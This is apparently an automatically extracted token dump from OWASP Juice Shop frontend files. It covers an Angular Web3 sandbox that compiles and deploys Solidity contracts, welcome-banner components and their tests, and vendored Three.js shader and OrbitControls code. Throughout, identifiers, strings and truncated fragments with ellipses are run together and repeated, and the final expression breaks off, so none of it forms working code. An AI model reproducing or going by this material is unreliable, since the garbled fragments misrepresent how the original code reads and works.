translate}}"BTN_INVOKE""BTN_IN ... anslateBTN_INVOKEfunctionwtext-containerdeployedaddresstext{{ "LABEL_CONTRACT_ADDRESS" | translate }}"LABEL_CONTRACT_ADDRESS""LABEL_ ... DDRESS"LABEL_CONTRACT_ADDRESS{{ deployedContractAddress }}deploySelectedContract(){{ "BTN_DEPLOY_SELECTED_CONTRACT" | translate}}"BTN_DEPLOY_SELECTED_CONTRACT""BTN_DE ... anslate"BTN_DE ... NTRACT"BTN_DEPLOY_SELECTED_CONTRACTwidth: 45%; margin-right: 10%let contractName of contractNames{{ contractName }}{{ "LABEL_COMPILED_CONTRACTS" | translate}}"LABEL_COMPILED_CONTRACTS""LABEL_ ... TRACTS"LABEL_COMPILED_CONTRACTScontracts-title{{ "TITLE_CONTRACT_DEPLOYMENT" | translate}}"TITLE_CONTRACT_DEPLOYMENT""TITLE_ ... OYMENT"TITLE_CONTRACT_DEPLOYMENTcompilerErrors.length > 0error-container mat-elevation-z6let error of compilerErrors{{ error.formattedMessage }}formattedMessageerror.f ... MessagecompileAndFetchContracts(code){{ "BTN_COMPILE_CONTRACT" | translate}}"BTN_COMPILE_CONTRACT""BTN_CO ... NTRACT"BTN_COMPILE_CONTRACTlet version of compilerVersions{{ version }}{{ "LABEL_SELECT_COMPILER_VERSION" | translate}}"LABEL_SELECT_COMPILER_VERSION""LABEL_ ... ERSION"LABEL_SELECT_COMPILER_VERSIONplayground-wallet{{
                userData.address.slice(-6)
              }}sandbox-container_body_leftngx-codemirroreditor-title{{"TITLE_CONTRACT_EDITOR" | translate}}"TITLE_CONTRACT_EDITOR""TITLE_ ... EDITOR"TITLE_CONTRACT_EDITORP:/My Drive/Git/juice-shop/frontend/src/app/web3-sandbox/web3-sandbox.component.tssolidityCompiler'solidity-browser-compiler'compilerReleases'0.8.21''soljson-v0.8.21+commit.d9974bed.js''0.8.9''soljson-v0.8.9+commit.e5eed63a.js''0.7.6''soljson-v0.7.6+commit.7338295f.js''0.6.12''soljson-v0.6.12+commit.27d51765.js''0.5.17''soljson-v0.5.17+commit.d19bba13.js''0.4.26''soljson-v0.4.26+commit.4563c3fc.js''0.3.6''soljson-v0.3.6+commit.3fc68da5.js''0.2.2''soljson-v0.2.2+commit.ef92f566.js''0.1.7''soljson-v0.1.7+commit.b4e666cc.js''app-web3-sandbox''./web3-sandbox.component.html''./web3-sandbox.component.scss'Web3SandboxComponent`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

contract HelloWorld {
    function get()public pure returns (string memory){
        return 'Hello Contracts';
    }
}`'text/x-solidity''dracula'lineNumberslineWrappingselectedVersion'Selected compiler version not found.'compilerInput`https://binaries.soliditylang.org/bin/${contractBodycontracts'output'Compiled_Contracts'Error compiling contracts:'selectedContract'Selected contract not found.'contractBytecodebytecodecontractAbiabifactoryContractFactorytransactionOptionsPayableOverrides'gwei'deploydeployedgetInputHints'No inputs''Error deploying contract:'parseInputValuefunctions'pure''hello'updatedFunc'Invoked:''Error invoking function''An error occured'import  ... mpiler''solidi ... mpiler'const c ... .js'\r\n}compile ... .js'\r\n}{\r\n  '0 ... .js'\r\n}'0.8.21 ... bed.js'0.8.21'soljso ... bed.js'soljson-v0.8.21+commit.d9974bed.jssoljson-v01+commitd9974bed'0.8.9' ... 63a.js'0.8.9'soljso ... 63a.js'soljson-v0.8.9+commit.e5eed63a.js9+e5eed63a'0.7.6' ... 95f.js'0.7.6'soljso ... 95f.js'soljson-v0.7.6+commit.7338295f.js6+7338295f'0.6.12 ... 765.js'0.6.12'soljso ... 765.js'soljson-v0.6.12+commit.27d51765.js2+27d51765'0.5.17 ... a13.js'0.5.17'soljso ... a13.js'soljson-v0.5.17+commit.d19bba13.js7+d19bba13'0.4.26 ... 3fc.js'0.4.2626'soljso ... 3fc.js'soljson-v0.4.26+commit.4563c3fc.js4563c3fc'0.3.6' ... da5.js'0.3.6'soljso ... da5.js'soljson-v0.3.6+commit.3fc68da5.js3fc68da5'0.2.2' ... 566.js'0.2.2'soljso ... 566.js'soljson-v0.2.2+commit.ef92f566.jsef92f566'0.1.7' ... 6cc.js'0.1.7'soljso ... 6cc.js'soljson-v0.1.7+commit.b4e666cc.jsb4e666ccselecto ... andbox'app-web3-sandbox'./web3 ... t.html'./web3-sandbox.component.html/web3-sandbox['./web ... .scss']'./web3 ... t.scss'./web3-sandbox.component.scssselecte ...  stringcompile ... ts = []contractNames = []commonG ... ber = 0contrac ... ns = []invokeOutput = ''selecte ... 0.8.21'compile ... leases)Object. ... leases)compilerErrors = []code: s ...   }\r\n}``// SPD ...   }\r\n}`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

contract HelloWorld {
    function get()public pure returns (string memory){
        return 'Hello Contracts';
    }
}// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

contract HelloWorld {
    function get()public pure returns (string memory){
        return 'Hello Contracts';
    }
}editorO ... ue\r\n  }mode: ' ... lidity'text/x-soliditytheme: 'dracula'draculalineNumbers: truelineWrapping: trueasync c ...  }\r\n  }this.de ... ss = ''this.de ... Addressconst s ...  stringcompile ...  stringcompile ...       ]this.se ... Version!selectedVersionconsole ... ound.')'Select ... found.'Selected compiler version not found.Selected compiler version not foundconst c ...       }compile ...       }version ... rsion}``https: ... rsion}`https:/ ... rg/bin/https://binaries.soliditylang.org/bin/contractBody: codeconst o ... rInput)output  ... rInput)await s ... rInput)solidit ... rInput)if (out ...       }output. ... ntractsoutput. ... gth > 0output.errorsoutput.errors.length!output.contractsoutput.contractsthis.co ... ntractsconsole ... errors)this.co ... errors)this.co ... rs.pushthis.compilerErrors...output.errorsthis.co ... rs = []console ... output)this.co ... tracts)this.contractNamesObject. ... tracts)this.se ... ames[0]this.se ... actNamethis.co ... ames[0]'Error  ... racts:'Error compiling contracts:const s ... actNameselecte ... actNameconst s ... ctName]selecte ... ctName]this.co ... ctName]!selectedContractSelected contract not found.Selected contract not foundconst c ... .objectcontrac ... .objectselecte ... .objectselecte ... ytecodeselectedContract.evmconst c ... act.abicontrac ... act.abiselectedContract.abiconst f ...       )factory ...       )ethers. ... Factoryconst t ... es = {}transac ... es = {}ethers. ... erridesthis.co ... lue > 0this.commonGweiValuetransac ... s.valueethers. ...       )this.co ... tring()this.co ... oStringgweiconst c ... ptions)contrac ... ptions)await f ... ptions)factory ... ptions)factory.deployawait c ... loyed()contract.deployed()contract.deployedthis.de ... addresscontract.addressthis.co ...      })this.co ... nctionscontrac ...    .mapcontrac ... ction')contrac ... .filter(item)  ... nction'item.ty ... nction'item.type(func)  ...       }const i ... inputs'inputHi ... inputs'func.in ... inputs'func.in ... gth > 0func.inputs.lengthfunc.inputsthis.ge ... inputs)this.getInputHintsNo inputs...funcinputValues: ''outputValue: ''console ... ctions)'Error  ... tract:'Error deploying contract:getInpu ... ')\r\n  }Array<{ ... ring }>{ name: ... tring }name: string,inputs. ... n(', ')inputs. ... `).joininputs. ... type}`)inputs.map(input) ... .type}``${inpu ... .type}`input.nameinput.typeparseIn ...  }\r\n  }type === 'bool'return  ...  'true'value.t ...  'true'value.toLowerCase()value.toLowerCasereturn valueasync i ...  }\r\n  }const i ...    : []inputs  ...    : []func.in ...    : []func.in ...  !== ''func.in ... .trim()func.in ... es.trimfunc.in ...      })func.in ... ,').mapfunc.in ... it(',')func.in ... s.split(value, ...       }const i ... x].typeinputTy ... x].typefunc.in ... x].typefunc.inputs[index]return  ... utType)this.pa ... utType)this.parseInputValuevalue.trim()value.trimcontrac ... c.name]contract.functions...inputsif (\r\n  ...       }func.ou ... 'pure')func.ou ... gth > 0func.outputs.lengthfunc.outputs(func.s ... 'pure')func.st ...  'pure'func.st ...  'view'func.stateMutabilityconsole.log('hello')helloconst o ... tring()outputV ... tring()transac ... tring()transac ... oStringtransaction[0]const u ...       )updated ...       )this.co ...       )this.co ... ns.find(f) =>  ... nc.namef.name === func.namef.nameif (upd ...       }updated ... utValueconst i ... f(func)index = ... f(func)this.co ... f(func)this.co ... indexOfif (ind ...       }index !== -1this.co ... tedFuncthis.co ... [index]console ... tValue)Invoked:'Error  ... nction'Error invoking functionupdated ... messageconsole ... cured')An error occuredP:/My Drive/Git/juice-shop/frontend/src/app/web3-sandbox/web3-sandbox.module.ts'./web3-sandbox.component'CodemirrorModule'@ctrl/ngx-codemirror''codemirror/mode/javascript/javascript''codemirror/mode/markdown/markdown''codemirror-solidity/solidity''./web3 ... ponent'./web3-sandbox.componentimport  ... mirror''@ctrl/ ... mirror'import  ... script''codemi ... script'codemirror/mode/javascript/javascriptimport  ... rkdown''codemi ... rkdown'codemirror/mode/markdown/markdownimport  ... lidity''codemi ... lidity'codemirror-solidity/solidity[Web3Sa ... ponent]P:/My Drive/Git/juice-shop/frontend/src/app/welcome/welcome.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/welcomeP:/My Drive/Git/juice-shop/frontend/src/app/welcome/welcome.component.spec.ts'./welcome.component''WelcomeComponent''should open the welcome banner dialog if configured to show on start''should not open the welcome banner dialog if configured to not show on start''should not open the welcome banner dialog if previously dismissed''dismiss'./welcome.component/welcome{ application: {} }[WelcomeComponent]cookieS ... tatus')should open the welcome banner dialog if configured to show on start{ appli ... e } } }applica ... rue } }{ welco ... rue } }welcome ...  true }{ showO ...  true }should not open the welcome banner dialog if configured to not show on startapplica ... lse } }{ welco ... lse } }welcome ... false }{ showO ... false }'should ... missed'should not open the welcome banner dialog if previously dismissedcookieS ... smiss')dismissP:/My Drive/Git/juice-shop/frontend/src/app/welcome/welcome.component.ts'../welcome-banner/welcome-banner.component''app-welcome''welcome.component.html''./welcome.component.scss'welcomeBannerStatusCookieKey'320px''35%''50px''../wel ... ponent'../welcome-banner/welcome-banner.componentselecto ... elcome''welcom ... t.html'welcome.component.htmlwelcome['./wel ... .scss']'./welc ... t.scss'./welcome.component.scssprivate ... status'welcome ... okieKeyconst w ... kieKey)welcome ... kieKey)this.co ... kieKey)this.we ... okieKeyif (wel ... \r\n    }welcome ... ismiss'!config ... stStartminWidth: '320px'320pxwidth: '35%'positio ...       }top: '50px'50pxP:/My Drive/Git/juice-shop/frontend/src/app/welcome-banner/welcome-banner.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/welcome-bannershowHackingInstructorshowHac ... tructor'SCORE_BOARD_HACKING_INSTRUCTOR'('SCORE ... nslate)'SCORE_ ... anslate'SCORE_ ... RUCTOR'SCORE_BOARD_HACKING_INSTRUCTORcloseWelcomecloseWelcome()showDismissBtnClose Welcome Banner('SCORE_BOARD_HACKING_INSTRUCTOR' | translate){{title}}P:/My Drive/Git/juice-shop/frontend/src/app/welcome-banner/welcome-banner.component.spec.ts'./welcome-banner.component''WelcomeBannerComponent'matDialogRef'should not dismiss if cookie not set'toHaveBeenCalledTimes'should dismiss and add cookie when closed''should dismiss and add cookie when starting hacking instructor''should set banner properties as obtained from configuration''Title''should show hacking instructor if enabled in configuration''should prevent dismissing banner in tutorial mode'./welcome-banner.component/welcome-banner'Welcom ... ponent'let mat ... ponent>matDial ... ponent>matDial ... lose'])[Welcom ... ponent]useValu ... alogRef'should ... ot set'should not dismiss if cookie not setexpect( ... imes(0)expect( ... edTimesmatDialogRef.closetoHaveB ... edTimes'should ... closed'should dismiss and add cookie when closedcompone ... lcome()compone ... Welcomeexpect( ... smiss')expect( ... atus'))'should ... ructor'should dismiss and add cookie when starting hacking instructorcompone ... uctor()compone ... tructorshould set banner properties as obtained from configurationapplica ... ge' } }{ welco ... ge' } }welcome ... sage' }{ title ... sage' }title: 'Title'Titlemessage: 'Message'expect( ... Title')expect( ... ssage')component.messageshould show hacking instructor if enabled in configurationof({ ha ... ue } }){ hacki ... rue } }hacking ...  true }{ isEnabled: true }expect( ... ructor)'should ... l mode'should prevent dismissing banner in tutorial modeof({ ch ... ue } }){ chall ... rue } }challen ...  true }{ restr ...  true }expect( ... eClose)compone ... leClosecomponent.dialogRefexpect( ... issBtn)compone ... missBtnP:/My Drive/Git/juice-shop/frontend/src/app/welcome-banner/welcome-banner.component.ts Don't allow to skip the tutorials when restrictToTutorialsFirst and showHackingInstructor are enabled// Don' ... enabled'app-welcome-banner''welcome-banner.component.html''./welcome-banner.component.scss''Welcome to OWASP Juice Shop'"<p>Being a web application with a vast number of intended security vulnerabilities, the <strong>OWASP Juice Shop</strong> is supposed to be the opposite of a best practice or template application for web developers: It is an awareness, training, demonstration and exercise tool for security risks in modern web applications. The <strong>OWASP Juice Shop</strong> is an open-source project hosted by the non-profit <a href='https://owasp.org' target='_blank'>Open Web Application Security Project (OWASP)</a> and is developed and maintained by volunteers. Check out the link below for more information and documentation on the project.</p><h1><a href='https://owasp-juice.shop' target='_blank'>https://owasp-juice.shop</a></h1>"selecto ... banner'app-welcome-bannerwelcome-banner.component.htmlwelcome-banner./welcome-banner.component.scss'Welcom ... e Shop'Welcome to OWASP Juice Shoppublic  ... ></h1>"<p>Being a web application with a vast number of intended security vulnerabilities, the <strong>OWASP Juice Shop</strong> is supposed to be the opposite of a best practice or template application for web developers: It is an awareness, training, demonstration and exercise tool for security risks in modern web applications The <strong>OWASP Juice Shop</strong> is an open-source project hosted by the non-profit <a href='https://owasporg' target='_blank'>Open Web Application Security Project (OWASP)</a> and is developed and maintained by volunteers Check out the link below for more information and documentation on the project</p><h1><a href='https://owasp-juiceshop' target='_blank'>https://owasp-juiceshop</a></h1>this.ti ... r.titleconfig. ... r.titlethis.me ... messagethis.messageconfig. ... messagethis.sh ... Enabledthis.sh ... tructorconfig? ... tructorthis.sh ... lsFirstconfig? ... lsFirstconfig?.challengesthis.di ... leClosethis.showDismissBtnthis.closeWelcome()this.closeWelcomecloseWe ... })\r\n  }public  ... ponent>P:/My Drive/Git/juice-shop/frontend/src/assets/private/CopyShader.jsP:/My Drive/Git/juice-shop/frontend/src/assets/privateP:/My Drive/Git/juice-shop/frontend/src/assets
 * @author alteredq / http://alteredqualia.com/
 *
 * Full-screen textured quad shader
 /**\r\n * ... er\r\n */	THREECopyShaderuniforms"tDiffuse""t""opacity""f"1.0vertexShader"varying vec2 vUv;""void main() {""vUv = uv;""gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );""}""\n"fragmentShader"uniform float opacity;""uniform sampler2D tDiffuse;""vec4 texel = texture2D( tDiffuse, vUv );""gl_FragColor = opacity * texel;"alteredq / http://alteredqualia.com/
* Full-screen textured quad shaderTHREE.C ... )\r\n\r\n};THREE.C ... ")\r\n\r\n}THREE.CopyShader{\r\n\r\n\tu ... ")\r\n\r\n}uniform ... }\r\n\r\n\t}{\r\n\r\n\t\t ... }\r\n\r\n\t}"tDiffu ...  null }tDiffuse{ type: ...  null }type: "t"value: null"opacit ... : 1.0 }{ type: ... : 1.0 }type: "f"value: 1.0vertexS ... n("\n")[\r\n\r\n\t\t ... n("\n")[\r\n\r\n\t\t ... \t].join[\r\n\r\n\t\t ... "\r\n\r\n\t]varying vec2 vUv;void main() {vUv = uv;"gl_Pos ... 1.0 );"gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );gl_Position = projectionMatrix * modelViewMatrix vec4( position, 1.0 ) position, 1.0  position, 10 fragmen ... n("\n")"unifor ... acity;"uniform float opacity;"unifor ... ffuse;"uniform sampler2D tDiffuse;"vec4 t ... vUv );"vec4 texel = texture2D( tDiffuse, vUv );vec4 texel = texture2D( tDiffuse, vUv ) tDiffuse, vUv "gl_Fra ... texel;"gl_FragColor = opacity * texel;gl_FragColor = opacity texel;P:/My Drive/Git/juice-shop/frontend/src/assets/private/EffectComposer.js
 * @author alteredq / http://alteredqualia.com/
 /**\r\n * ... m/\r\n */ shared ortho camera// shar ...  cameraEffectComposerrendererrenderTargetparametersminFilterLinearFiltermagFilterRGBFormatstencilBufferWebGLRenderTargetrenderTarget1renderTarget2writeBufferreadBufferpasses"THREE.EffectComposer relies on THREE.CopyShader"copyPassShaderPassswapBufferstmpaddPassinsertPassrendermaskActiveilneedsSwap0xffffffffMaskPassClearMaskPasssetSizecameraOrthographicCameraquadMeshPlaneGeometrysceneScenealteredq / http://alteredqualia.com/THREE.E ... ;\r\n\r\n};THREE.E ... );\r\n\r\n}THREE.EffectComposerfunctio ... );\r\n\r\n}{\r\n\r\n\tt ... );\r\n\r\n}this.re ... nderer;this.re ... endererthis.rendererif ( re ... ;\r\n\r\n\t}renderT ... defined{\r\n\r\n\t\t ... ;\r\n\r\n\t}var wid ... h || 1;width = ... th || 1window. ... th || 1var hei ... t || 1;height  ... ht || 1window. ... ht || 1window.innerHeightvar par ... alse };paramet ... false }{ minFi ... false }minFilt ... rFilterTHREE.LinearFiltermagFilt ... rFilterformat: ... BFormatTHREE.RGBFormatstencilBuffer: falserenderT ... ters );renderT ... eters )new THR ... eters )THREE.W ... rTargetthis.re ... Target;this.re ... rTargetthis.renderTarget1this.re ... lone();this.re ... clone()this.renderTarget2renderTarget.clone()renderTarget.clonethis.wr ... arget1;this.wr ... Target1this.writeBufferthis.re ... arget2;this.re ... Target2this.readBufferthis.passes = [];this.passes = []this.passesif ( TH ... der" );THREE.C ... definedconsole ... der" );console ... ader" )"THREE. ... Shader"THREE.EffectComposer relies on THREE.CopyShaderEffectComposer relies on THREEthis.co ... ader );this.co ... hader )this.copyPassnew THR ... hader )THREE.ShaderPassTHREE.E ... }\r\n\r\n};THREE.E ... \t}\r\n\r\n}THREE.E ... ototype{\r\n\r\n\ts ... \t}\r\n\r\n}swapBuf ... ;\r\n\r\n\t}functio ... ;\r\n\r\n\t}var tmp ... Buffer;tmp = t ... dBufferthis.re ... Buffer;this.re ... eBufferthis.wr ...  = tmp;this.wr ... r = tmpaddPass ... ;\r\n\r\n\t}this.pa ... pass );this.pa ...  pass )this.passes.pushinsertP ... ;\r\n\r\n\t}this.passes.splicerender: ... }\r\n\r\n\t}functio ... }\r\n\r\n\t}var mas ...  false;maskActive = falsevar pas ... length;il = th ... .lengththis.passes.lengthfor ( i ... \r\n\r\n\t\t}i < ili ++{\r\n\r\n\t\t ... \r\n\r\n\t\t}pass =  ... s[ i ];pass =  ... es[ i ]this.passes[ i ]if ( !p ... ntinue;!pass.enabledpass.enabledcontinue;pass.re ... tive );pass.re ... ctive )pass.renderif ( pa ... \n\r\n\t\t\t}pass.needsSwap{\r\n\r\n\t\t ... \n\r\n\t\t\t}if ( ma ... \r\n\t\t\t\t}{\r\n\r\n\t\t ... \r\n\t\t\t\t}var con ... ontext;context ... contextthis.re ... contextcontext ... ffff );context ... fffff )context.stencilFunccontext.NOTEQUAL4294967295this.co ... elta );this.co ... delta )this.copyPass.rendercontext.EQUALthis.swapBuffers();this.swapBuffers()this.swapBufferspass in ... askPassTHREE.MaskPassmaskActive = true;maskActive = trueTHREE.ClearMaskPassmaskActive = false;reset:  ... ;\r\n\r\n\t}if ( re ... \r\n\r\n\t\t}renderT ... lone();renderT ... clone()this.re ... 1.clonerenderT ... rWidth;renderT ... erWidthrenderTarget.widthrenderT ... Height;renderT ... rHeightrenderTarget.heightsetSize ... ;\r\n\r\n\t}var ren ... lone();renderT ...  width;renderT ... = widthrenderT ... height;renderT ...  heightthis.re ... rget );this.re ... arget )this.resetTHREE.E ... 0, 1 );THREE.E ...  0, 1 )THREE.E ... .cameranew THR ...  0, 1 )THREE.O ... cCameraTHREE.E ... null );THREE.E ...  null )THREE.E ... er.quadnew THR ...  null )THREE.Meshnew THR ...  2, 2 )THREE.PlaneGeometryTHREE.E ... cene();THREE.E ... Scene()THREE.E ... r.scenenew THREE.Scene()THREE.SceneTHREE.E ... quad );THREE.E ... .quad )THREE.E ... ene.addP:/My Drive/Git/juice-shop/frontend/src/assets/private/MaskPass.js don't update color or depth// don' ... r depth set up stencil// set up stencil draw into the stencil buffer// draw ...  buffer re-enable update of color and depth// re-e ... d depth only render where stencil is set to 1// only ... et to 1 draw if == 1// draw if == 1writeValueclearValueTHREE.M ... ;\r\n\r\n};THREE.M ... e;\r\n\r\n}functio ... e;\r\n\r\n}{\r\n\r\n\tt ... e;\r\n\r\n}this.scene = scene;this.scene = scenethis.scenethis.ca ... camera;this.camera = camerathis.camerathis.enabled = true;this.enabled = truethis.enabledthis.clear = true;this.clear = truethis.clearthis.ne ...  false;this.ne ... = falsethis.needsSwapthis.in ...  false;this.inverse = falsethis.inverseTHREE.M ... }\r\n\r\n};THREE.M ... \t}\r\n\r\n}THREE.M ... ototype{\r\n\r\n\tr ... \t}\r\n\r\n}render: ... ;\r\n\r\n\t}renderer.contextcontext ... alse );context ... false )context.colorMaskcontext.depthMaskvar wri ... rValue;if ( th ... \r\n\r\n\t\t}writeValue = 0;writeValue = 0clearValue = 1;clearValue = 1writeValue = 1;writeValue = 1clearValue = 0;clearValue = 0context ... TEST );context ... _TEST )context.enablecontext.STENCIL_TESTcontext ... LACE );context ... PLACE )context.stencilOpcontext.REPLACEcontext.ALWAYScontext ... alue );context ... Value )context.clearStencilrendere ... lear );rendere ... clear )renderer.rendercontext ... true );context ...  true )context ... KEEP );context ... .KEEP )context.KEEPTHREE.C ... ;\r\n\r\n};THREE.C ... e;\r\n\r\n}THREE.C ... }\r\n\r\n};THREE.C ... \t}\r\n\r\n}THREE.C ... ototypecontext.disableP:/My Drive/Git/juice-shop/frontend/src/assets/private/OrbitControls.js
 * @author qiao / https://github.com/qiao
 * @author mrdoob / http://mrdoob.com
 * @author alteredq / http://alteredqualia.com/
 * @author WestLangley / http://github.com/WestLangley
 * @author erich666 / http://erichaines.com
 /**\r\n * ... om\r\n */global THREE, console /*globa ... sole */ This set of controls performs orbiting, dollying (zooming), and panning. It maintains// This ... intains the "up" direction as +Y, unlike the TrackballControls. Touch on tablet and phones is// the  ... ones is supported.// supported.    Orbit - left mouse / touch: one finger move//    O ... er move    Zoom - middle mouse, or mousewheel / touch: two finger spread or squish//    Z ...  squish    Pan - right mouse, or arrow keys / touch: three finter swipe//    P ... r swipe This is a drop-in replacement for (most) TrackballControls used in examples.// This ... amples. That is, include this js file and wherever you see:// That ... ou see:    	controls = new THREE.TrackballControls( camera );//    \t ... mera );      controls.target.z = 150;//      ...  = 150; Simple substitute "OrbitControls" and the control should work as-is.// Simp ...  as-is. API// API Set to false to disable this control// Set  ... control "target" sets the location of focus, where the control orbits around// "tar ...  around and where it pans with respect to.// and  ... ect to. center is old, deprecated; use "target" instead// cent ... instead This option actually enables dollying in and out; left as "zoom" for// This ... om" for backwards compatibility// back ... ibility Limits to how far you can dolly in and out// Limi ... and out Set to true to disable this control pixels moved per arrow key push// pixe ... ey push Set to true to automatically rotate around the target// Set  ...  target 30 seconds per round when fps is 60// 30 s ... s is 60 How far you can orbit vertically, upper and lower limits.// How  ... limits. Range is 0 to Math.PI radians.// Rang ... adians. radians// radians Set to true to disable use of the keys// Set  ... he keys The four arrow keys// The  ... ow keys////////////////////// internals// internals events// events pass in distance in world space to move left// pass ... ve left get X column of matrix// get  ...  matrix pass in distance in world space to move up// pass ... move up get Y column of matrix main entry point; pass in Vector2 of change desired in pixel space,// main ...  space, right and down are positive// righ ... ositive perspective// perspective half of the fov is center to top of screen// half ...  screen we actually don't use screenWidth, since perspective camera is fixed to screen height// we a ...  height orthographic// orthographic camera neither orthographic or perspective - warn user// came ... rn user angle from z-axis around y-axis// angl ...  y-axis angle from y-axis// angle from y-axis restrict phi to be between desired limits// rest ...  limits restrict phi to be betwee EPS and PI-EPS// rest ...  PI-EPS restrict radius to be between desired limits move target to panned location// move ... ocation Greggman fix: https://github.com/greggman/three.js/commit/fde9f9917d6d8381f06bf22cdff766029d1761be// Greg ... d1761be rotating across whole screen goes 360 degrees around// rota ...  around rotating up and down along whole screen attempts to go 360, but limited to 180// rota ...  to 180 event /* event */ WebKit / Opera / Explorer 9// WebK ... lorer 9 Firefox// Firefox pan a pixel - I guess for precise positioning?// pan  ... ioning? one-fingered touch: rotate// one- ...  rotate two-fingered touch: dolly// two- ... : dolly three-fingered touch: pan// thre ... ch: pan firefox// firefoxOrbitControlsdomElementVector3noZoomzoomSpeedminDistancemaxDistancenoRotaterotateSpeednoPankeyPanSpeed7.0autoRotateautoRotateSpeed2.0minPolarAnglemaxPolarAnglenoKeysLEFTUP38RIGHT39BOTTOMEPS0.000001rotateStartVector2rotateEndrotateDeltapanStartpanEndpanDeltadollyStartdollyEnddollyDeltaphiDeltathetaDeltapanlastPositionSTATEROTATEDOLLYPANTOUCH_ROTATETOUCH_DOLLYTOUCH_PANchangeEvent'change'rotateLeftgetAutoRotationAngle-=rotateUppanLeftdistancepanOffsettemultiplyScalarpanUpfovtargetDistance180.0'WARNING: OrbitControls.js encountered an unknown camera type - pan disabled.'dollyIndollyScalegetZoomScale/=dollyOutthetaphilookAtdistanceTo0.95onMouseDown'mousemove'onMouseMove'mouseup'onMouseUpsubVectorsonMouseWheelonKeyDownneedUpdatetouchstarttouchmovetouchend'contextmenu''mousedown''mousewheel''DOMMouseScroll''keydown''touchstart''touchend''touchmove'EventDispatcherqiao / https://github.com/qiao
mrdoob / http://mrdoob.com
alteredq / http://alteredqualia.com/
WestLangley / http://github.com/WestLangley
erich666 / http://erichaines.comTHREE.O ... ;\r\n\r\n};THREE.O ... );\r\n\r\n}THREE.OrbitControls{\r\n\r\n   ... );\r\n\r\n}this.ob ... object;this.object = objectthis.objectthis.do ... cument;this.do ... ocumentthis.domElement( domEl ... ocument( domEl ... fined )domElem ... definedthis.ta ... tor3();this.ta ... ctor3()this.targetnew THREE.Vector3()THREE.Vector3this.ce ... target;this.ce ... .targetthis.centerthis.noZoom = false;this.noZoom = falsethis.noZoomthis.zo ...  = 1.0;this.zoomSpeed = 1.0this.zoomSpeedthis.mi ... ce = 0;this.minDistance = 0this.minDistancethis.ma ... finity;this.ma ... nfinitythis.maxDistancethis.no ...  false;this.no ... = falsethis.noRotatethis.ro ...  = 1.0;this.ro ... d = 1.0this.rotateSpeedthis.noPan = false;this.noPan = falsethis.noPanthis.ke ...  = 7.0;this.ke ... d = 7.0this.keyPanSpeedthis.au ...  false;this.au ... = falsethis.autoRotatethis.au ...  = 2.0;this.au ... d = 2.0this.autoRotateSpeedthis.mi ... le = 0;this.mi ... gle = 0this.minPolarAnglethis.ma ... ath.PI;this.ma ... Math.PIthis.maxPolarAnglethis.noKeys = false;this.noKeys = falsethis.noKeysthis.ke ... : 40 };this.ke ... M: 40 }this.keys{ LEFT: ... M: 40 }LEFT: 37UP: 38RIGHT: 39BOTTOM: 40var scope = this;scope = thisvar EPS = 0.000001;EPS = 0.0000011.0E-6var rot ... tor2();rotateS ... ctor2()new THREE.Vector2()THREE.Vector2rotateE ... ctor2()rotateD ... ctor2()var pan ... tor2();panStar ... ctor2()panEnd  ... ctor2()panDelt ... ctor2()var dol ... tor2();dollySt ... ctor2()dollyEn ... ctor2()dollyDe ... ctor2()var phiDelta = 0;phiDelta = 0var thetaDelta = 0;thetaDelta = 0var scale = 1;scale = 1var pan ... tor3();pan = n ... ctor3()var las ... tor3();lastPos ... ctor3()var STA ...  : 5 };STATE = ... N : 5 }{ NONE  ... N : 5 }NONE : -1ROTATE : 0DOLLY : 1PAN : 2TOUCH_ROTATE : 3TOUCH_DOLLY : 4TOUCH_PAN : 5var sta ... E.NONE;state = STATE.NONESTATE.NONEvar cha ... nge' };changeE ... ange' }{ type: 'change' }type: 'change'this.ro ... \n    };this.ro ... \r\n    }this.rotateLeft{\r\n\r\n   ... \r\n    }if ( an ...       }angle === undefined{\r\n\r\n   ...       }angle = ... ngle();angle = ... Angle()getAuto ... Angle()thetaDelta -= angle;thetaDelta -= anglethis.rotateUpphiDelta -= angle;phiDelta -= anglethis.pa ... \n    };this.pa ... \r\n    }this.panLeftpanOffs ... ctor3()var te  ... ements;te = th ... lementsthis.ob ... lementsthis.object.matrixpanOffs ... e[2] );panOffs ... te[2] )panOffset.sette[0]te[1]te[2]panOffs ... tance);panOffs ... stance)panOffs ... yScalar-distancepan.add ... fset );pan.add( panOffset )pan.addthis.panUppanOffs ... e[6] );panOffs ... te[6] )te[4]te[5]te[6]this.panvar ele ... lement;element ... Elementscope.d ... Elementscope.d ... ocumentscope.domElementscope.d ... nt.bodyif ( sc ...       }scope.o ... definedscope.object.fovscope.objectvar pos ... sition;positio ... ositionscope.o ... ositionvar off ... rget );offset  ... arget )positio ... arget )position.clone().subposition.clone()position.clonescope.targetvar tar ... ngth();targetD ... ength()offset.length()offset.lengthtargetD ... 80.0 );targetD ... 180.0 )Math.ta ... 180.0 )(scope. ... / 180.0(scope. ... Math.PI(scope.object.fov/2)scope.object.fov/2180scope.p ... ight );scope.p ... eight )scope.panLeft2 * del ... tHeight2 * del ... istance2 * delta.xdelta.xelement.clientHeightscope.panUp2 * delta.ydelta.yscope.object.topscope.p ... idth );scope.p ... Width )delta.x ... ntWidthdelta.x ... t.left)(scope. ... t.left)scope.o ... ct.leftscope.object.rightscope.object.leftelement.clientWidthdelta.y ... tHeightdelta.y ... bottom)(scope. ... bottom)scope.o ... .bottomscope.object.bottomconsole ... ed.' );console ... led.' )console.warn'WARNIN ... abled.'WARNING: OrbitControls.js encountered an unknown camera type - pan disabled.WARNING: OrbitControlsjs encountered an unknown camera type - pan disabledthis.do ... \n    };this.do ... \r\n    }this.dollyInif ( do ...       }dollySc ... defineddollySc ... cale();dollySc ... Scale()getZoomScale()scale /= dollyScale;scale /= dollyScalethis.dollyOutscale *= dollyScale;scale *= dollyScalethis.up ... \n    };this.updatethis.object.positionvar the ... et.z );theta = ... set.z )Math.at ... set.z )offset.xoffset.zvar phi ... et.y );phi = M ... set.y )Math.at ... set.y )Math.sq ... set.z )offset. ... ffset.zoffset.x * offset.xoffset.z * offset.zoffset.yif ( th ...       }this.ro ... le() );this.ro ... gle() )theta += thetaDelta;theta += thetaDeltaphi += phiDelta;phi += phiDeltaphi = M ... hi ) );phi = M ... phi ) 